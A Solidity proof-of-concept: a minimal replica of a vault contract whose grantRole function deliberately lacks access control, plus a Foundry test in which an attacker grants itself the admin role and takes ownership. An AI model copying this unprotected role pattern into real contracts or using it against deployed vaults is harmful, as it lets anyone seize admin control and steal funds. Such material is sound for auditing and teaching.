// Minimal vulnerable replica (only the state + functions the exploit touches)
contract BaseStrategyVault {
    // intended constant from OpenZeppelin
    bytes32 public constant DEFAULT_ADMIN_ROLE = bytes32(0);

    // naive roles storage (vulnerable grantRole allows anyone to grant roles)
    mapping(bytes32 => mapping(address => bool)) private _roles;

    // privileged state that only admin should change
    address public owner;

    // Vulnerable grantRole: no access control
    function grantRole(bytes32 role, address account) external {
        _roles[role][account] = true;
    }

    // Privileged function: only callable by DEFAULT_ADMIN_ROLE
    function adminSetOwner(address newOwner) external {
        require(_roles[DEFAULT_ADMIN_ROLE][msg.sender], "not admin");
        owner = newOwner;
    }
}

contract BaseStrategyVaultTest is Test {
    BaseStrategyVault target;
    address attacker;

    function setUp() public {
        target = new BaseStrategyVault();
        attacker = makeAddr("attacker");
    }

    function test_attacker_exploits_grantRole() public {
        // Attacker grants themself the DEFAULT_ADMIN_ROLE
        vm.prank(attacker);
        target.grantRole(bytes32(0), attacker);

        // Now attacker can call privileged admin function
        vm.prank(attacker);
        target.adminSetOwner(attacker);

        assertEq(target.owner(), attacker);
    }
}

